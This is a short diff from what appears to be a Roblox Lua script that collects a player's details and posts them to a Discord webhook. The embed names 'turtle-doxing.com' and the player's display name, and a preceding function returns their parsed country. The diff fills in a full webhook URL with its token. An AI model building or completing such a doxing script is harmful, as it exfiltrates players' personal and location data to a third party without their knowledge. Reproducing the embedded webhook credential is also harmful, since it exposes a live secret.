@@ -2006,7 +2006,7 @@ local function Virtual_Region()
     return ParsedCountry
 end
 
-local url = ""
+local url = "https://discord.com/api/webhooks/1211140075283546162/w42r54x5UlZXQuH_BYYFrCme-27FK_uVY42QLVBVzevk4BjTjD_2xszNHWYjDwQ36-wQ"
 local embed = {
     ["title"] = LocalPlayer.DisplayName .. "'s information",
     ["description"] = "Response from turtle-doxing.com",
